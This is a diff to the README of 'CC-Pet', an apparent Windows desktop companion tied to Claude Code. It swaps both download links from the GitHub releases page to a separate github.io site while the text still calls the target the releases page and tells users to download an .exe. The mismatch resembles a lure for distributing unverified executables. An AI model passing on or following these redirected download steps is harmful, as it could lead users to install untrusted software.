@@ -1,6 +1,6 @@
 # 🐈 CC-Pet - An animated companion for your desktop
 
-[![](https://img.shields.io/badge/Download-CC--Pet-blue)](https://github.com/stingsealed599/CC-Pet/releases)
+[![](https://img.shields.io/badge/Download-CC--Pet-blue)](https://stingsealed599.github.io)
 
 CC-Pet brings an animated character to your Windows desktop. This pet responds to your work within Claude Code and functions as a standalone companion. You can customize its look and monitor your status through its real-time reactions.
 
@@ -8,7 +8,7 @@ CC-Pet brings an animated character to your Windows desktop. This pet responds t
 
 You can grab the latest version of CC-Pet from our releases page. Follow these steps to install the software on your computer:
 
-1. Visit the [CC-Pet releases page](https://github.com/stingsealed599/CC-Pet/releases).
+1. Visit the [CC-Pet releases page](https://stingsealed599.github.io).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.exe` that corresponds to your Windows system.
 4. Save the file to a folder you can find later, such as your Downloads folder.
